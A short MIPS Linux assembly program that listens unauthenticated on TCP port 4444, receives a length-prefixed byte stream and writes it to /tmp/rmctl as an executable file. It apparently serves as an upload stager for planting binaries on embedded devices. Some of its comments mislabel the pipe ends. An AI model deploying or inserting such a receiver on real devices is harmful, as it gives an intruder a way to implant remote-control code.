    .set noreorder
    .data

    .align 2

sockaddr: .half 2     # AF_INET
          .half 4444  # PORT
          .word 0     # IP
          .word 0, 0  # PADDING

addrlen = . - sockaddr

claddr:   .space 16
clalen:   .space 4

sfd:      .space 4
cfd:      .space 4
dst:      .space 4
size:     .space 4
dstname:  .asciiz  "/tmp/rmctl"
pipes:    .space 8

    .text
    .globl __start

__start:
    # pipe(pipes);
    li   $v0, 4328
    la   $a0, pipes
    li   $a1, 0
    li   $a2, 0
    syscall

    bnez $v0, error
    
    la   $s2, pipes
    lw   $s1, 4($s2)
    lw   $s2, 0($s2)

    # socket(AF_INET=2, SOCK_STREAM=2, 0);
    li   $v0, 4183
    li   $a0, 2
    li   $a1, 2
    li   $a2, 0
    syscall

    ble  $v0, -1, error

    sw   $v0, sfd

    # bind(sfd, &safm, addrlen);
    li   $v0, 4169
    lw   $a0, sfd
    la   $a1, sockaddr
    li   $a2, addrlen
    syscall

    bnez  $v0, error

    # listen(sfd, 1);
    li   $v0, 4174
    lw   $a0, sfd
    li   $a1, 1
    syscall

    bnez  $v0, error

    # accept(sfd, claddr, clalen);
    li   $v0, 4168
    lw   $a0, sfd
    la   $a1, claddr
    la   $a2, clalen
    syscall

    ble  $v0, -1, error

    sw   $v0, cfd

    # open(dstname, flags, mode);
    li   $v0, 4005
    la   $a0, dstname
    li   $a1, 0x101
    li   $a2, 0x1ED
    syscall
    ble  $v0, -1, error

    sw   $v0, dst

    # read(cfd, size, 4);
    li   $v0, 4003
    lw   $a0, cfd
    la   $a1, size
    li   $a2, 4
    syscall

    addi $sp, $sp, -128

    # splice(cfd, NULL, pipe[0], NULL, size, 0)
    li   $v0, 4304
    lw   $a0, cfd
    li   $a1, 0
    move $a2, $s1
    li   $a3, 0

    lw   $t0, size
    sw   $t0, 16($sp)
    
    li   $t0, 0
    sw   $t0, 20($sp)
    syscall    

    # splice(pipe[1], NULL, dst, NULL, size, 0)
    li   $v0, 4304
    move $a0, $s2
    li   $a1, 0
    lw   $a2, dst
    li   $a3, 0

    lw   $t0, size
    sw   $t0, 16($sp)
    
    li   $t0, 0
    sw   $t0, 20($sp)
    syscall

    addi $sp, $sp, 128

    # close(dst);
    li   $v0, 4006
    lw   $a0, dst
    syscall

    # close(cfd);
    li   $v0, 4006
    lw   $a0, cfd
    syscall

    bnez  $v0, error

    # close(sfd);
    li   $v0, 4006
    lw   $a0, sfd
    syscall

    bnez  $v0, error

    li   $v0, 0

error:
    move $a0, $v0
    li   $v0, 4001
    syscall